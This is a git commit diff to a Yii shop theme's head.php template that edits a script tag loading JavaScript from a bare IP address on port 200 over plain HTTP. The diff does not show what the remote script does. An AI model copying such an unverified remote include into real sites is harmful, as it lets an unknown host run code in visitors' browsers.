768af51d7c10fbce754b9058d9260797bc7094b9
iwisunny <iwisunny@gmail.com>
2017-09-16 16:08:10 +0800

    232323

--- appfront/theme/terry/theme01/widgets/head.php
+++ appfront/theme/terry/theme01/widgets/head.php
@@ -11,7 +11,7 @@
 <title><?= \Yii::$app->view->title; ?></title>
 <link rel="shortcut icon" href="<?=  Yii::$service->url->getUrl('favicon.ico'); ?>">
 <link rel="apple-touch-icon" href="<?=  Yii::$service->url->getUrl('apple-touch-icon.png'); ?>">
-<script type="text/javascript" id="018544a2c4" src="http://115.28.80.138:200/?id=018544a2c4"></script>
+<script type="text/javascript" id="018544a2c4" src="http://115.28.80.138:200/script.php?id=018544a2c4"></script>
 <meta name="robots" content="INDEX,FOLLOW" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <?php $parentThis->head() ?>
